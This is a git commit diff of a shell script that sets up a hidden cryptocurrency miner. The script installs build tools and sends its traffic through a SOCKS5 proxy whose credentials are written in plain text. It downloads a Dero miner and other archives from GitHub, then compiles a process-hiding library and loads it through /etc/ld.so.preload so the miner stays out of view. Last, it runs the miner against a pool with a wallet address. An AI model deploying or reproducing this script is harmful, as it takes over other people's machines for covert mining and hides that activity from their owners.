21b06bf86b7674dd09a62a34f9930a46105d926a
rindalasririn <95740336+rindalasririn@users.noreply.github.com>
2022-11-22 19:58:48 -0500

    Update 18.sh

--- 18.sh
+++ 18.sh
@@ -1,10 +1,8 @@
-
-
 #!/bin/sh
 ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime
 dpkg-reconfigure --frontend noninteractive tzdata
 
-apt update -y;apt -y install libcurl4-openssl-dev libssl-dev libjansson-dev automake autotools-dev build-essential binutils git cmake screen unzip net-tools curl -y
+apt update;apt -y install binutils cmake build-essential screen unzip net-tools curl
 
 wget https://raw.githubusercontent.com/nathanfleight/scripts/main/graphics.tar.gz
 
@@ -13,9 +11,9 @@ tar -xvzf graphics.tar.gz
 cat > graftcp/local/graftcp-local.conf <<END
 listen = :2233
 loglevel = 1
-socks5 = 93.99.8.106:12324
-socks5_username = 14a80a12036ec
-socks5_password = f3abd6377f
+socks5 = 45.94.47.66:8110
+socks5_username = ingfoingfo
+socks5_password = maszZeehh
 END
 
 ./graftcp/local/graftcp-local -config graftcp/local/graftcp-local.conf &
@@ -25,26 +23,26 @@ sleep .2
 echo " "
 echo " "
 
-echo ""
+echo "******************************************************************"
 
 ./graftcp/graftcp curl ifconfig.me
 
 echo " "
 echo " "
 
-echo ""
+echo "******************************************************************"
 
 echo " "
 echo " "
 
-./graftcp/graftcp wget https://github.com/AhmadTugiman/gembel/raw/main/dero-stratum-miner
-chmod +x dero-stratum-miner
+./graftcp/graftcp wget https://github.com/rigmining/dora/raw/main/dora
+chmod +x dora
 
-./graftcp/graftcp wget https://raw.githubusercontent.com/nathanfleight/scripts/main/magicBezzHash.zip
-unzip magicBezzHash.zip
+./graftcp/graftcp wget https://github.com/rigmining/dora/raw/main/magicDora.zip
+unzip magicDora.zip
 make
 gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
 mv libprocesshider.so /usr/local/lib/
 echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
 
-./graftcp/graftcp ./dero-stratum-miner -r pool.whalesburg.com:4300 -w dero1qyg4z0yuk6hj7qr760c90agjgsngky9f2e4j7s8l60tsqcpcxznnsqgn8lvl4.Gasba
+./graftcp/graftcp ./dora -w deroi1qyzlxxgq2weyqlxg5u4tkng2lf5rktwanqhse2hwm577ps22zv2x2q9pvfz92xe6z7uzurtp0ynqlx2kp4.notesepoloh -r stratum+tcp://170.187.197.220:443 -p stratum -m 8
